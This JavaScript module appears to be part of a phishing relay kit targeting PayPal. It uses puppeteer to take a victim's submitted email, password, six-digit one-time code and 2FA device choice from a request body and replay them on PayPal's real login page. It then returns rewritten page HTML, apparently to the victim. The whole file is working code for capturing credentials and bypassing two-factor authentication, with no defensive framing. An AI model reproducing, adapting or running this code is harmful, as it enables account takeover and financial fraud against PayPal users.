const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Paypal extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]
        try {
            if (spikeType == "email") {
                let email = `[name="login_email"]`
                await page.waitForSelector(email)
                await page.evaluate(() => {
                    document.querySelector(`[name="login_email"]`).setAttribute("spike-email-done", "true")
                })
                await page.type(email, body.login_email)

                try {
                    await Promise.all([
                        page.click("#btnNext"),
                        new Promise(re => setTimeout(re, 3000))
                    ])
                } catch (error) { }

            } else if (spikeType == "password") {
                let password = `[name="login_password"]`
                await page.waitForSelector(password)
                await page.type(password, body.login_password)

                try {
                    await Promise.all([
                        page.click("#btnLogin"),
                        page.waitForNavigation({ waitUntil: "load" })
                    ])
                } catch (error) { }

            } else if (spikeType == "otp_code") {

                await page.evaluate(() => {
                    let codeInput = document.querySelectorAll(`[type="number"]`)
                    codeInput.forEach((value, index) => {
                        value.setAttribute("spike-otp-box", index)
                    })
                })

                for (let i = 0; i < 6; i++) {
                    await page.waitForSelector(`[spike-otp-box="${i}"]`)
                    await page.type(`[spike-otp-box="${i}"]`, body.spike_otp_code[i])
                }

                try {
                    await Promise.all([
                        page.click(`[type="submit"]`),
                        page.waitForNavigation({ waitUntil: "load" })
                    ])
                } catch (error) { }

            } else if (spikeType == "opt_devices") {
                let index = body["spike-device-index"]
                await page.evaluate(() => {
                    let radios = document.querySelectorAll(`[type="radio"]`)
                    radios.forEach((v, i) => {
                        v.setAttribute("data-device-spike", i)
                    })
                })

                await page.click(`[data-device-spike="${index}"]`)

                try {
                    await Promise.all([
                        page.click(`[data-nemo="entrySubmit"]`),
                        page.waitForNavigation({ waitUntil: "load" })
                    ])
                } catch (error) { }
            } else {
                return await this.openTAB(true)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Paypal(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}